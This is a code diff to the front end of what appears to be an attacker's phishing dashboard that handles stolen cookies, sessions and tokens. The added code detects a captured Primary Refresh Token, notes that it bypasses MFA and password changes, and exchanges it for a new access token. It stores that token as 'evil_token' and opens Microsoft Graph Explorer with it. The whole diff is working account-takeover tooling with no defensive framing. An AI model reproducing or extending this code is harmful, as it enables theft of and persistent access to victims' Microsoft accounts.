@@ -896,7 +896,7 @@
         });
     }
 
-    // ---------- FETCH VISITS (with Country Flags) ----------
+    // ---------- FETCH VISITS ----------
     async function fetchVisits() {
         try {
             const res = await fetch('/dash/api/visits');
@@ -1038,6 +1038,7 @@
         }
     }
 
+    // ---------- SHOW TOKENS (with PRT detection) ----------
     async function showTokens(filename) {
         try {
             const res = await fetch(`/dash/api/tokens/${filename}`);
@@ -1054,6 +1055,20 @@
             msg += `  • Cookies: ${tokens.cookies.length}\n`;
             msg += `  • Sessions: ${tokens.sessions.length}`;
             
+            // ✅ PRT Detection
+            const hasPrt = tokens.prt || tokens.flowToken;
+            if (hasPrt) {
+                msg += `\n\n🔑 **PRT (Primary Refresh Token) Found!**`;
+                msg += `\n   ✅ Long-term access token (weeks/months)`;
+                msg += `\n   🔄 Bypasses MFA and password changes`;
+                msg += `\n   📝 Length: ${(tokens.prt || tokens.flowToken).length} characters`;
+                msg += `\n\n   💡 Click OK to exchange PRT for a fresh access token.`;
+                if (confirm(msg + '\n\nExchange PRT for a new access token?')) {
+                    await exchangePRT(tokens.prt || tokens.flowToken);
+                    return;
+                }
+            }
+            
             if (tokens.refresh_tokens.length > 0) {
                 msg += `\n\n🔄 Refresh token available. Click OK to exchange for a new access token.`;
                 if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
@@ -1067,6 +1082,7 @@
         }
     }
 
+    // ---------- EXCHANGE REFRESH TOKEN ----------
     async function exchangeRefreshToken(refreshToken) {
         try {
             const response = await fetch('/dash/api/exchange', {
@@ -1084,6 +1100,27 @@
             }
         } catch (e) {
             showToast('❌ Exchange error: ' + e.message, true);
+        }
+    }
+
+    // ---------- EXCHANGE PRT ----------
+    async function exchangePRT(token) {
+        try {
+            const response = await fetch('/dash/api/prt/exchange', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ prt: token })
+            });
+            const data = await response.json();
+            if (data.access_token) {
+                showToast(`✅ PRT exchange successful! New access token obtained.`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
+            } else {
+                showToast('❌ PRT exchange failed: ' + (data.error || 'Unknown error'), true);
+            }
+        } catch (e) {
+            showToast('❌ PRT exchange error: ' + e.message, true);
         }
     }
 
